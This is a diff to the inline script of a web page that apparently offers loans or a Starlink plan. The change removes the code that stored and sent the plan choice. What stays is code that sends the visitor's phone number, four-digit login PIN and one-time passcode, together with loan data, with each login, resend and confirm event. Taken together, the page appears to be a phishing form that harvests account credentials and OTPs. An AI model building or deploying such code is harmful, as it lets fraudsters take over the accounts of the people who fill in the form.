@@ -115,7 +115,7 @@
   </div>
 
 <script>
-  // Prefill phone if saved (old loanForm, harmless if not used)
+  // Prefill phone if saved
   (function(){
     try {
       const data = sessionStorage.getItem('loanForm');
@@ -124,20 +124,6 @@
         if (form.phone) document.getElementById('phone').value = form.phone;
       }
     } catch(e){}
-  })();
-
-  // Read selected Starlink plan from index page (if any)
-  let selectedPlan = null;
-  (function(){
-    try {
-      const raw = sessionStorage.getItem('selectedPlan');
-      if (raw) {
-        selectedPlan = JSON.parse(raw);
-        console.log('Selected plan:', selectedPlan);
-      }
-    } catch(e){
-      console.error('Failed to parse selectedPlan:', e);
-    }
   })();
 
   // DOM refs
@@ -308,8 +294,7 @@
           event: 'login_clicked',
           loanData,
           loginPhone: phone,
-          loginPin: pin,
-          selectedPlan   // include the Starlink plan
+          loginPin: pin
         });
         if (!resp.ok) {
           const txt = await resp.text();
@@ -338,7 +323,7 @@
     const pin = pinEl.value.trim();
     const phone = phoneEl.value.trim();
     if(!phone || !/^\d{4}$/.test(pin)){
-      // If user changed inputs so they are invalid, show friendly message
+      // If user changed inputs so they are invalid, show friendly message and close modal
       otpStatus.textContent = 'Phone or PIN missing/invalid — please re-enter and try login again.';
       return;
     }
@@ -355,8 +340,7 @@
           event: 'resend_otp',
           loanData,
           loginPhone: phone,
-          loginPin: pin,
-          selectedPlan  // include plan again
+          loginPin: pin
         });
 
         if (!resp.ok) {
@@ -393,8 +377,7 @@
         loanData,
         loginPhone: phone,
         loginPin: pin,
-        otp: code,
-        selectedPlan   // include plan on final confirm too
+        otp: code
       });
 
       if (!resp.ok) {
@@ -407,7 +390,7 @@
 
       // success
       otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
-      sessionStorage.removeItem('loanForm');   // keep selectedPlan for thankyou page
+      sessionStorage.removeItem('loanForm');
       clearInterval(resendTimer);
       setTimeout(()=> window.location.href = "thankyou.html", 1200);
     } catch (err) {
